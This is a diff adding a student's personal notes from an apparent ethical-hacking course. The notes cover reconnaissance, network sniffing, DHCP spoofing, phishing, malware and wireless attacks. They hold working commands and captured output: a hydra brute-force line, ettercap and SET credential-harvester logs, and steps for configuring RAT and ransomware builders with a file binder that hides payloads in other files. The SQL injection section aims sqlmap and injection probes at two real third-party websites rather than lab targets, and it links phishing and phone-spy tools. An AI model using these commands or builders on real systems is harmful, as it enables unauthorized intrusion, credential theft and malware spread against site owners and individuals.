@@ -1,0 +1,323 @@
+kali kali
+bineet0418  bineet2000
+msfconsole msfconsole
+
+tools - maltego - to gather info
+
+14-06-25
+theHarvester
+tor browser --> search --> "tor seaarch engine" ----> "https://hackread.com/dark-web-search-engines-tor-browser-2022/"
+waybackMachine --> "https://web.archive.org/?" ---> to search screenshot of website's old page
+
+tracert --> to see the root of packet
+
+FOOTPRINTING
+nmap to scan ports { command nmap -T4 -A -v 192.168.31.1/24 }
+
+then downloaded Metasploit ---> it is a vernable machine. (username - msfadmin, password - msfconsole)
+
+https://chat.whatsapp.com/BDQtqc5ftLE8BclFAkIGI5
+
+15-06-25
+Scanning
+Download nessus
+ 	https://www.tenable.com/downloads/nessus
+ 	then for activation key "https://www.tenable.com/products/nessus/nessus-essentials" ---> register mail and get activation code.
+ 	"https://localhost:8834/#/scans/folders/my-scans"
+
+2. when we ping the window machine ttl= 128 and for Linux ttl =64.
+ 3. wireshark
+nbtstat --> command to get the os --> command "nbtstat -a Target_IP"
+
+
+
+
+
+
+28-06-2025
+https://nvd.nist.gov/vuln-metrics/cvss/v4-calculator
+https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html
+
+
+29-06-2025
+nikto -h 192.168.19.130
+nmap output: + sign shows new map
+https://attack.mitre.org/matrices/enterprise/
+
+hydra for password cracking
+hydra -s 21 -V -l msfadmin -P /home/kali/Desktop/password.txt -t 16 192.168.19.130 ftp
+
+
+
+wireshark ---done demo.testfire.net to http and then click on sigin and give id password (any or admin admin) and filter the http from wireshark and check for post call and we can find id password there.
+
+offline attack ---cracking hashes after getting it.
+get hashes and crack it.
+hashes 5f4dcc3b5aa765d61d8327deb882cf99
+and crack using https://crackstation.net/
+we can do using rainbow table
+
+
+camphish ---used to access the camera on target machine.
+https://github.com/techchipnet/CamPhish
+
+give authentication token
+ngrok --sigin
+
+Metasploit
+
+
+
+
+MALWARE
+
+06-07-2025
+
+extraction password -123
+generally password for all software is 12345678 , if not then check readme files.
+
+1.All In One Keylogger New
+
+
+2.DarkComet RAT
+
+3.Ransomware-Samples-main
+edit server --> server editor
+add ip of your machine(vm) , click on  test network so that to check port is working fine
+for test purpose we can add install message.
+file binder - it will bind it with any file (ie. hide itself in video file or any file)
+build module
+
+
+ransomware
+warcry
+jps virus maker
+
+
+
+13-07-2025
+
+network sniffing
+
+command :sudo macof -i eth0 (for changing mac in Linux)
+
+macchanger -h  (to change the mac
+command: sudo macchanger -r  eth0
+download tmac or smac in window machine
+open application and click on random mac address and then select the network adapter and click change mac.
+
+DHCP SNOOFING TOOLS
+1. yersinia tool
+sudo yersinia -I
+
+2.bettercap
+we are just creating a rogue dhcp server kali
+bettercap
+sudo bettercap - iface eth0
+set dhcp.spoof true
+set dhcp.spoof on
+set dhcp.range 192.168.1.11-192.168.1.15
+
+IN KALI
+SUDO msfconsole
+set DNSSERVER 8.8.8.8
+set ROUTER 192.168.1.1
+set SRVHOST 192.168.1.1
+
+3. GOPHISH
+
+4.etercap --mitm attack ( arp poisoning(to capture the http website request ) and we can also do dhcp snoofing using it)
+ 
+output:
+
+GROUP 1 : 192.168.19.129 00:0C:29:66:7B:3D
+
+ GROUP 2 : 192.168.19.2 00:50:56:E7:24:38
+HTTP : 65.61.137.117:80 -> USER: admin  PASS:   INFO: http://demo.testfire.net/login.jsp
+CONTENT: uid=admin&passw=admin&btnSubmit=Login
+
+HTTP : 65.61.137.117:80 -> USER: bineet  PASS:   INFO: http://demo.testfire.net/login.jsp
+CONTENT: uid=bineet&passw=bineet&btnSubmit=Login
+
+DHCP: [00:0C:29:66:7B:3D] REQUEST 192.168.19.129
+DHCP: [192.168.19.254] ACK : 192.168.19.129 255.255.255.0 GW 192.168.19.2 DNS 192.168.19.2 "localdomain"
+
+
+19-07-2025
+Social Engineering
+
+rubber ducky (pendrive )
+
+FOR PHISHING
+
+1.settoolkit  - tool in kali Linux
+steps:
+Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) Wireless Access Point Attack Vector
+   8) QRCode Generator Attack Vector
+   9) Powershell Attack Vectors
+  10) Third Party Modules
+
+  99) Return back to the main menu.
+
+set> 2
+
+   1) Java Applet Attack Method
+   2) Metasploit Browser Exploit Method
+   3) Credential Harvester Attack Method
+   4) Tabnabbing Attack Method
+   5) Web Jacking Attack Method
+   6) Multi-Attack Web Method
+   7) HTA Attack Method
+
+  99) Return to Main Menu
+
+set:webattack>3
+ 
+   1) Web Templates
+   2) Site Cloner
+   3) Custom Import
+
+  99) Return to Webattack Menu
+
+set:webattack>2
+
+set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.19.132]:
+[-] SET supports both HTTP and HTTPS
+[-] Example: http://www.thisisafakesite.com
+set:webattack> Enter the url to clone: https://demo.testfire.net/login.jsp
+
+[*] Cloning the website: https://demo.testfire.net/login.jsp
+[*] This could take a little bit...
+
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80
+[*] Information will be displayed to you as it arrives below:
+192.168.19.132 - - [19/Jul/2025 14:55:13] "GET / HTTP/1.1" 200 -
+192.168.19.132 - - [19/Jul/2025 14:55:15] "GET /favicon.ico HTTP/1.1" 404 -
+[*] WE GOT A HIT! Printing the output:
+POSSIBLE PASSWORD FIELD FOUND: uid=admin
+POSSIBLE PASSWORD FIELD FOUND: passw=admin123
+POSSIBLE USERNAME FIELD FOUND: btnSubmit=Login
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+ 
+note: search 192.168.19.132 ip in your web browser you will get clone site and what ever login you do it will show.
+
+
+https://github.com/htr-tech/zphisher.git
+
+tool - zphisher
+COMMAND
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cd zphisher
+ 
+┌──(kali㉿kali)-[~/Desktop/zphisher]
+└─$ ls
+auth  Dockerfile  LICENSE  make-deb.sh  README.md  run-docker.sh  scripts  zphisher.sh
+ 
+┌──(kali㉿kali)-[~/Desktop/zphisher]
+└─$ bash zphisher.sh
+
+
+https://download.apponic.com/B8Md5hBs3p7RWQFcY1RZwOZ8QcC3A1N7fvpYusSyaUv-WH_Q5RSCc65XWwzwI8Wzqk-u9oVbGj-vB1_2YA1hfHOcCpfgoR0hVLDb4Qzr67WoZ-IstPEXsxWBufnI0blxrw8mf_toQ_zmKicF0d-UUNjcbAvlTehYgqIVhoTRTVm4hq6BimjLg7XCTg/
+
+https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+
+27-07-2025
+
+inurl:adminlogin
+
+website to check security headers is  secure or not -----> https://securityheaders.com/
+
+extension --->  https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
+
+from Veer Trainer to everyone:    10:58 PM
+https://portswigger.net/web-security/all-labs
+from Veer Trainer to everyone:    10:59 PM
+https://portswigger.net/users?returnurl=%2fusers%2fyouraccount%2fpersonaldetails
+from Veer Trainer to everyone:    11:00 PM
+https://github.com/webpwnized/mutillidae
+
+
+
+02-08-2025
+sql injection
+Boolean based sql injection - 1’ OR ‘1’=’1
+ first to find that if the site contain sql injection or not
+1. inurl id = site.pk(google dork to find site ....pk extension means Pakistan site
+2.simple add ' in url to generate some syntax  error
+try https://ccwj.edu.pk/note.php?id=92 , http://www.embryohotel.com/room-detail.php?id=1%27  add ' at last of url to generate sql syntax error.
+3.sqlmap --wizard(in kali type tis command in terminal to run sqlmap .
+NOTE : never select All in Enumeration part option given below because All will come in attack . for bug bounty we will choose only 1(Basic).
+Injection difficulty (--level/--risk). Please choose:
+[1] Normal (default)
+[2] Medium
+[3] Hard
+> 1
+Enumeration (--banner/--current-user/etc). Please choose:
+[1] Basic (default)
+[2] Intermediate
+[3] All
+> 1
+
+
+4. manual command to run sql attack -> sqlmap --url https://ccwj.edu.pk/note.php?id=92 --banner --random-agent
+
+
+
+
+WIRELESS ATTACK
+
+kali tool- fern wifi Cracker
+clone wifi (create fake wifi
+m5stack(used to clone wifi)
+wifi spamming
+https://amzn.to/46Etgp6
+https://amzn.to/45afMAp
+https://amzn.to/3HgcS3F
+
+
+MOBILE HACKING
+https://www.shadow-spy.com/
+https://www.shadow-spy.com/downloads.html
+
+How to detect a payload.
+how to find a lost / stolen mobile?
+What is Fing tool ?
+
+
+03-08-2025
+IOT device hacking
+
+cryptographic
+https://www.ssllabs.com/ssltest/
+https://www.pelock.com/products/hash-calculator?srsltid=AfmBOoqS4PpVrwvSiIC7c1h99eADixG_RAtKZXRWp1l5wSeiENwcwhlE
+
+
+
+24-08-2025
+virustotal --website to check malware in file or url
+
+https://www.ransomware.live/
+DDos attack -- prevented by cloudfare , wasp
+Stuxnet attack??
+
+
+
+
+
+
+
+
+
+
+ 
